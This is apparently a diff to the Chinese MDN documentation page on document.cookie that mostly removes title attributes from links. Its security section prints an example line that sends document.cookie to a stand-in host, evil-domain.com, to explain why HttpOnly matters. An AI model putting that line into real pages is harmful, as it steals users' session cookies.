@@ -34,13 +34,13 @@ translation_of: Web/API/Document/cookie
    <li><code>;max-age=<em>max-age-in-seconds</em></code> (例如一年为 60*60*24*365)</li>
    <li><code>;expires=<em>date-in-GMTString-format</em></code> 如果没有定义，cookie 会在对话结束时过期
     <ul>
-     <li>这个值的格式参见<a href="/en-US/docs/JavaScript/Reference/Global_Objects/Date/toUTCString" title="JavaScript/Reference/Global Objects/Date/toUTCString">Date.toUTCString()</a> </li>
+     <li>这个值的格式参见<a href="/en-US/docs/JavaScript/Reference/Global_Objects/Date/toUTCString">Date.toUTCString()</a> </li>
     </ul>
    </li>
    <li><code>;secure</code> (cookie 只通过 https 协议传输)</li>
   </ul>
  </li>
- <li>cookie 的值字符串可以用<a href="/en-US/docs/JavaScript/Reference/Global_Objects/encodeURIComponent" title="JavaScript/Reference/Global_Functions/encodeURIComponent">encodeURIComponent()</a>来保证它不包含任何逗号、分号或空格 (cookie 值中禁止使用这些值).</li>
+ <li>cookie 的值字符串可以用<a href="/en-US/docs/JavaScript/Reference/Global_Objects/encodeURIComponent">encodeURIComponent()</a>来保证它不包含任何逗号、分号或空格 (cookie 值中禁止使用这些值).</li>
 </ul>
 
 <div class="note">
@@ -83,7 +83,7 @@ alert(myCookie);
 
 <h2 id="一个小框架：一个完整支持unicode的cookie读取写入器">一个小框架：一个完整支持 unicode 的 cookie 读取/写入器</h2>
 
-<p>作为一个格式化过的字符串，cookie 的值有时很难被自然地处理。下面的库的目的是通过定义一个和<code><a href="https://developer.mozilla.org/en-US/docs/Web/Guide/API/DOM/Storage#Storage">Storage 对象</a></code>部分<code>一致的</code>对象（docCookies），简化<code style="font-style: normal;">document.cookie</code> 的获取方法。它提供完全的 Unicode 支持。</p>
+<p>作为一个格式化过的字符串，cookie 的值有时很难被自然地处理。下面的库的目的是通过定义一个和<code><a href="/en-US/docs/Web/Guide/API/DOM/Storage#Storage">Storage 对象</a></code>部分<code>一致的</code>对象（docCookies），简化<code style="font-style: normal;">document.cookie</code> 的获取方法。它提供完全的 Unicode 支持。</p>
 
 <pre class="brush: js notranslate">/*\
 |*|
@@ -144,7 +144,7 @@ var docCookies = {
   }
 };</pre>
 
-<div class="note"><strong>Note:</strong> 对于永久 cookie 我们用了<code>Fri, 31 Dec 9999 23:59:59 GMT</code>作为过期日。如果你不想使用这个日期，可使用<em><a href="http://en.wikipedia.org/wiki/Year_2038_problem" title="http://en.wikipedia.org/wiki/Year_2038_problem">世界末日</a></em><code>Tue, 19 Jan 2038 03:14:07 GMT，</code>它是 32 位带符号整数能表示从 1 January 1970 00:00:00 UTC 开始的最大秒长 (即<code>01111111111111111111111111111111</code>, 是 <code>new Date(0x7fffffff * 1e3)</code>).</div>
+<div class="note"><strong>Note:</strong> 对于永久 cookie 我们用了<code>Fri, 31 Dec 9999 23:59:59 GMT</code>作为过期日。如果你不想使用这个日期，可使用<em><a href="http://en.wikipedia.org/wiki/Year_2038_problem">世界末日</a></em><code>Tue, 19 Jan 2038 03:14:07 GMT，</code>它是 32 位带符号整数能表示从 1 January 1970 00:00:00 UTC 开始的最大秒长 (即<code>01111111111111111111111111111111</code>, 是 <code>new Date(0x7fffffff * 1e3)</code>).</div>
 
 <h3 id="写入cookie">写入 cookie</h3>
 
@@ -160,17 +160,17 @@ var docCookies = {
 
 <dl>
  <dt><code>name</code> (必要)</dt>
- <dd>要创建或覆盖的 cookie 的名字 (<a href="/en-US/docs/JavaScript/Reference/Global_Objects/String" title="JavaScript/Reference/Global_Objects/String"><code>string</code></a>)。</dd>
+ <dd>要创建或覆盖的 cookie 的名字 (<a href="/en-US/docs/JavaScript/Reference/Global_Objects/String"><code>string</code></a>)。</dd>
  <dt><code>value</code> (必要)</dt>
- <dd>cookie 的值 (<a href="/en-US/docs/JavaScript/Reference/Global_Objects/String" title="JavaScript/Reference/Global_Objects/String"><code>string</code></a>)。</dd>
+ <dd>cookie 的值 (<a href="/en-US/docs/JavaScript/Reference/Global_Objects/String"><code>string</code></a>)。</dd>
  <dt><code>end</code> <em>(可选)</em></dt>
- <dd><a href="#new-cookie_max-age"><code>最大年龄</code></a>的秒数 (一年为 31536e3， 永不过期的 cookie 为<a href="/en-US/docs/JavaScript/Reference/Global_Objects/Infinity" title="JavaScript/Reference/Global_Objects/Infinity"><code>Infinity</code></a>) ，或者过期时间的<a href="/en-US/docs/JavaScript/Reference/Global_Objects/Date/toGMTString" title="/en-US/docs/JavaScript/Reference/Global_Objects/Date/toGMTString"><code>GMTString</code></a>格式或<code><a href="/en-US/docs/JavaScript/Reference/Global_Objects/Date" title="/en-US/docs/JavaScript/Reference/Global_Objects/Date">Date 对象</a></code>; 如果没有定义则会在会话结束时过期 (<a href="/en-US/docs/JavaScript/Reference/Global_Objects/Number" title="JavaScript/Reference/Global_Objects/Number"><code>number</code></a> – 有限的或 <a href="/en-US/docs/JavaScript/Reference/Global_Objects/Infinity" title="JavaScript/Reference/Global_Objects/Infinity"><code>Infinity</code></a> – <a href="/en-US/docs/JavaScript/Reference/Global_Objects/String" title="JavaScript/Reference/Global_Objects/String"><code>string</code></a>, <a href="/en-US/docs/JavaScript/Reference/Global_Objects/Date" title="JavaScript/Reference/Global_Objects/Date"><code>Date</code> object</a> or <a href="/en-US/docs/Web/JavaScript/Reference/Global_Objects/null" title="/en-US/docs/Web/JavaScript/Reference/Global_Objects/null"><code>null</code></a>)。</dd>
+ <dd><a href="#new-cookie_max-age"><code>最大年龄</code></a>的秒数 (一年为 31536e3， 永不过期的 cookie 为<a href="/en-US/docs/JavaScript/Reference/Global_Objects/Infinity"><code>Infinity</code></a>) ，或者过期时间的<a href="/en-US/docs/JavaScript/Reference/Global_Objects/Date/toGMTString"><code>GMTString</code></a>格式或<code><a href="/en-US/docs/JavaScript/Reference/Global_Objects/Date">Date 对象</a></code>; 如果没有定义则会在会话结束时过期 (<a href="/en-US/docs/JavaScript/Reference/Global_Objects/Number"><code>number</code></a> – 有限的或 <a href="/en-US/docs/JavaScript/Reference/Global_Objects/Infinity"><code>Infinity</code></a> – <a href="/en-US/docs/JavaScript/Reference/Global_Objects/String"><code>string</code></a>, <a href="/en-US/docs/JavaScript/Reference/Global_Objects/Date"><code>Date</code> object</a> or <a href="/en-US/docs/Web/JavaScript/Reference/Global_Objects/null"><code>null</code></a>)。</dd>
  <dt><code>path</code> <em>(可选)</em></dt>
- <dd>例如 '/', '/mydir'。 如果没有定义，默认为当前文档位置的路径。(<a href="/en-US/docs/JavaScript/Reference/Global_Objects/String" title="JavaScript/Reference/Global_Objects/String"><code>string</code></a> or <a href="/en-US/docs/Web/JavaScript/Reference/Global_Objects/null" title="/en-US/docs/Web/JavaScript/Reference/Global_Objects/null"><code>null</code></a>)。路径必须为绝对路径（参见 <a href="http://www.ietf.org/rfc/rfc2965.txt">RFC 2965</a>）。关于如何在这个参数使用相对路径的方法请参见<a href="#Using_relative_URLs_in_the_path_parameter" style="text-decoration: underline;">这段</a>。</dd>
+ <dd>例如 '/', '/mydir'。 如果没有定义，默认为当前文档位置的路径。(<a href="/en-US/docs/JavaScript/Reference/Global_Objects/String"><code>string</code></a> or <a href="/en-US/docs/Web/JavaScript/Reference/Global_Objects/null"><code>null</code></a>)。路径必须为绝对路径（参见 <a href="http://www.ietf.org/rfc/rfc2965.txt">RFC 2965</a>）。关于如何在这个参数使用相对路径的方法请参见<a href="#Using_relative_URLs_in_the_path_parameter">这段</a>。</dd>
  <dt><code>domain</code> <em>(可选)</em></dt>
- <dd>例如 'example.com'， '.example.com' (包括所有子域名), 'subdomain.example.com'。如果没有定义，默认为当前文档位置的路径的域名部分 (<code><a href="/en-US/docs/JavaScript/Reference/Global_Objects/String" title="JavaScript/Reference/Global_Objects/String">string</a>或</code><a href="/en-US/docs/Web/JavaScript/Reference/Global_Objects/null" title="/en-US/docs/Web/JavaScript/Reference/Global_Objects/null"><code>null</code></a>)。</dd>
+ <dd>例如 'example.com'， '.example.com' (包括所有子域名), 'subdomain.example.com'。如果没有定义，默认为当前文档位置的路径的域名部分 (<code><a href="/en-US/docs/JavaScript/Reference/Global_Objects/String">string</a>或</code><a href="/en-US/docs/Web/JavaScript/Reference/Global_Objects/null"><code>null</code></a>)。</dd>
  <dt><code>secure</code> <em>(可选)</em></dt>
- <dd>cookie 只会被 https 传输 (<a href="/en-US/docs/JavaScript/Reference/Global_Objects/Boolean" title="JavaScript/Reference/Global_Objects/Boolean"><code>boolean</code></a>或<a href="/en-US/docs/Web/JavaScript/Reference/Global_Objects/null" title="/en-US/docs/Web/JavaScript/Reference/Global_Objects/null"><code>null</code></a>)。</dd>
+ <dd>cookie 只会被 https 传输 (<a href="/en-US/docs/JavaScript/Reference/Global_Objects/Boolean"><code>boolean</code></a>或<a href="/en-US/docs/Web/JavaScript/Reference/Global_Objects/null"><code>null</code></a>)。</dd>
 </dl>
 
 <h3 id="得到cookie">得到 cookie</h3>
@@ -181,13 +181,13 @@ var docCookies = {
 
 <h5 id="描述_2">描述</h5>
 
-<p>读取一个 cookie。如果 cookie 不存在返回<a href="/en-US/docs/Web/JavaScript/Reference/Global_Objects/null" title="/en-US/docs/Web/JavaScript/Reference/Global_Objects/null"><code>null</code></a>。</p>
+<p>读取一个 cookie。如果 cookie 不存在返回<a href="/en-US/docs/Web/JavaScript/Reference/Global_Objects/null"><code>null</code></a>。</p>
 
 <h5 id="参数_2">参数</h5>
 
 <dl>
  <dt><code>name</code></dt>
- <dd>读取的 cookie 名 (<a href="/en-US/docs/JavaScript/Reference/Global_Objects/String" title="JavaScript/Reference/Global_Objects/String"><code>string</code></a>).</dd>
+ <dd>读取的 cookie 名 (<a href="/en-US/docs/JavaScript/Reference/Global_Objects/String"><code>string</code></a>).</dd>
 </dl>
 
 <h3 id="移除cookie">移除 cookie</h3>
@@ -204,11 +204,11 @@ var docCookies = {
 
 <dl>
  <dt><code>name</code></dt>
- <dd>要移除的 cookie 名 (<a href="/en-US/docs/JavaScript/Reference/Global_Objects/String" title="JavaScript/Reference/Global_Objects/String"><code>string</code></a>).</dd>
+ <dd>要移除的 cookie 名 (<a href="/en-US/docs/JavaScript/Reference/Global_Objects/String"><code>string</code></a>).</dd>
  <dt><code>path</code> <em>(</em>可选<em>)</em></dt>
- <dd>例如 '/', '/mydir'。 如果没有定义，默认为当前文档位置的路径。(<a href="/en-US/docs/JavaScript/Reference/Global_Objects/String" title="JavaScript/Reference/Global_Objects/String"><code>string</code></a> or <a href="/en-US/docs/Web/JavaScript/Reference/Global_Objects/null" title="/en-US/docs/Web/JavaScript/Reference/Global_Objects/null"><code>null</code></a>)。路径必须为绝对路径（参见 <a href="http://www.ietf.org/rfc/rfc2965.txt">RFC 2965</a>）。关于如何在这个参数使用相对路径的方法请参见<a href="#Using_relative_URLs_in_the_path_parameter" style="text-decoration: underline;">这段</a>。</dd>
+ <dd>例如 '/', '/mydir'。 如果没有定义，默认为当前文档位置的路径。(<a href="/en-US/docs/JavaScript/Reference/Global_Objects/String"><code>string</code></a> or <a href="/en-US/docs/Web/JavaScript/Reference/Global_Objects/null"><code>null</code></a>)。路径必须为绝对路径（参见 <a href="http://www.ietf.org/rfc/rfc2965.txt">RFC 2965</a>）。关于如何在这个参数使用相对路径的方法请参见<a href="#Using_relative_URLs_in_the_path_parameter">这段</a>。</dd>
  <dt><code>domain </code>(可选)</dt>
- <dd>例如 'example.com'， '.example.com' (包括所有子域名), 'subdomain.example.com'。如果没有定义，默认为当前文档位置的路径的域名部分 (<code><a href="/en-US/docs/JavaScript/Reference/Global_Objects/String" title="JavaScript/Reference/Global_Objects/String">string</a>或</code><a href="/en-US/docs/Web/JavaScript/Reference/Global_Objects/null" title="/en-US/docs/Web/JavaScript/Reference/Global_Objects/null"><code>null</code></a>)。</dd>
+ <dd>例如 'example.com'， '.example.com' (包括所有子域名), 'subdomain.example.com'。如果没有定义，默认为当前文档位置的路径的域名部分 (<code><a href="/en-US/docs/JavaScript/Reference/Global_Objects/String">string</a>或</code><a href="/en-US/docs/Web/JavaScript/Reference/Global_Objects/null"><code>null</code></a>)。</dd>
 </dl>
 
 <h3 id="检测cookie">检测 cookie</h3>
@@ -225,7 +225,7 @@ var docCookies = {
 
 <dl>
  <dt><code>name</code></dt>
- <dd>要检查的 cookie 名 (<a href="/en-US/docs/JavaScript/Reference/Global_Objects/String" title="JavaScript/Reference/Global_Objects/String"><code>string</code></a>).</dd>
+ <dd>要检查的 cookie 名 (<a href="/en-US/docs/JavaScript/Reference/Global_Objects/String"><code>string</code></a>).</dd>
 </dl>
 
 <h3 id="得到所有cookie的列表">得到所有 cookie 的列表</h3>
@@ -271,23 +271,23 @@ alert(docCookies.getItem("test1;="));</pre>
 
 <pre class="notranslate"><code>(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;</code></pre>
 
-<p><code>HttpOnly</code> 属性可以阻止通过 javascript 访问 cookie，从而一定程度上遏制这类攻击。参见 <a class="external" href="http://www.nczonline.net/blog/2009/05/12/cookies-and-security/" title="http://www.nczonline.net/blog/2009/05/12/cookies-and-security/">Cookies and Security</a>.</p>
+<p><code>HttpOnly</code> 属性可以阻止通过 javascript 访问 cookie，从而一定程度上遏制这类攻击。参见 <a href="http://www.nczonline.net/blog/2009/05/12/cookies-and-security/">Cookies and Security</a>.</p>
 
 <h2 id="Specification">备注</h2>
 
 <ul>
- <li>从 Firefox 2 起，有更好的客户端存储机制用以替代 cookie - <a href="/en-US/docs/DOM/Storage" title="DOM/Storage">WHATWG DOM Storage</a>.</li>
+ <li>从 Firefox 2 起，有更好的客户端存储机制用以替代 cookie - <a href="/en-US/docs/DOM/Storage">WHATWG DOM Storage</a>.</li>
  <li>你可以通过更新一个 cookie 的过期时间为 0 来删除一个 cookie。</li>
- <li>请注意，更多/更大的 cookies 意味着每个请求都要包含更繁重的数据传输。如果您只是需要存储些 "client-only" 的数据，那么郑重建议您使用 <a href="/en-US/docs/DOM/Storage" title="DOM/Storage">WHATWG DOM Storage</a>.</li>
+ <li>请注意，更多/更大的 cookies 意味着每个请求都要包含更繁重的数据传输。如果您只是需要存储些 "client-only" 的数据，那么郑重建议您使用 <a href="/en-US/docs/DOM/Storage">WHATWG DOM Storage</a>.</li>
 </ul>
 
 <h2 id="Specification">规范</h2>
 
-<p><a class="external" href="http://www.w3.org/TR/DOM-Level-2-HTML/html.html#ID-8747038">DOM Level 2: HTMLDocument.cookie</a></p>
+<p><a href="http://www.w3.org/TR/DOM-Level-2-HTML/html.html#ID-8747038">DOM Level 2: HTMLDocument.cookie</a></p>
 
 <h2 id="参见">参见</h2>
 
 <ul>
- <li><a href="/en-US/docs/Web_Development/HTTP_cookies" title="HTTP cookies">HTTP cookies</a></li>
- <li><a href="/en-US/docs/Code_snippets/Cookies" title="Cookies">Cookies</a> (Code snippets)</li>
+ <li><a href="/en-US/docs/Web_Development/HTTP_cookies">HTTP cookies</a></li>
+ <li><a href="/en-US/docs/Code_snippets/Cookies">Cookies</a> (Code snippets)</li>
 </ul>
